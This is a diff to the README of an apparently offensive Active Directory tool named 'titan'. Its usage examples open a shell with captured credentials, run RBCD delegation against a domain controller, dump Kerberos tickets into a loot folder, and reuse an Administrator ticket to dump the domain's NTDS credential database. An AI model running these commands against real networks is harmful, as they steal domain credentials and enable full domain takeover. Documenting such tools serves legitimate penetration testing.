@@ -35,10 +35,14 @@ titan shell ECORP/user:'pass'@192.168.15.42
 # RBCD full auto
 titan rbcd full --delegate-to ECORP-DC$ ECORP/user:'pass'@192.168.15.40
 
-# Dump all Kerberos TGTs → ccache files
+# Dump all Kerberos TGTs → ccache files (requires Tsch binary)
 titan klist ECORP/user:'pass'@192.168.15.40
 titan klist -u user -d ECORP --hash :NThash -t 192.168.15.40 -o ./loot/
 KRB5CCNAME=admin.ccache titan klist -k -no-pass -K dc01.ecorp.local -t dc01.ecorp.local
+
+# Use a dumped TGT for follow-on actions
+export KRB5CCNAME=./loot/Administrator@ECORP.LOCAL_0x3e4.ccache
+titan dump -k -no-pass --ntds -dc-ip dc01.ecorp.local -t dc01.ecorp.local
 ```
 
 → **[Full usage docs](../../wiki)**
